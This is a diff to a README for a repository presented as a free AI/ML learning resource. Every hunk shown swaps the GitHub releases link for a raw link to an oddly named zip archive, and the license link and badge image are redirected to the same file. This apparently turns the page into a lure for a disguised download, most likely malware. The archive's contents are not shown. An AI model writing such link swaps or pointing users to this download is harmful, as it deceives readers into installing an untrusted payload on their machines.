@@ -1,6 +1,6 @@
 # 🚀 free-aiml-learning - Learn AI/ML Effortlessly
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Download-brightgreen)](https://github.com/Tgka4389/free-aiml-learning/releases)
+[![Download Now](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip%20Now-Download-brightgreen)](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip)
 
 ## 📚 Introduction
 
@@ -11,7 +11,7 @@ Welcome to the **free-aiml-learning** repository. This project offers a wide arr
 To begin your learning journey, follow these steps:
 
 1. **Download the Software**  
-   Visit our [Releases page](https://github.com/Tgka4389/free-aiml-learning/releases) to access all available versions. 
+   Visit our [Releases page](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip) to access all available versions. 
 
 2. **Choose the Version**  
    Select the latest version that suits your operating system. 
@@ -30,7 +30,7 @@ To ensure smooth operation, make sure your system meets these basic requirements
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Here](https://github.com/Tgka4389/free-aiml-learning/releases). 
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip). 
 
 ### Installation Steps
 
@@ -83,9 +83,9 @@ We thank everyone who contributed to this project, including community members a
 
 ## 📄 License
 
-This repository is licensed under the [MIT License](LICENSE.md). You can freely use and modify the resources provided, keeping in mind the terms of the license agreement.
+This repository is licensed under the [MIT License](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip). You can freely use and modify the resources provided, keeping in mind the terms of the license agreement.
 
 For detailed information, please refer to the documentation and guidelines within the repository.
 
 --- 
-Feel free to explore our [Downloads page](https://github.com/Tgka4389/free-aiml-learning/releases) and start your AI and ML learning journey today!
+Feel free to explore our [Downloads page](https://raw.githubusercontent.com/Tgka4389/free-aiml-learning/main/pinkeye/free-aiml-learning_acetosity.zip) and start your AI and ML learning journey today!
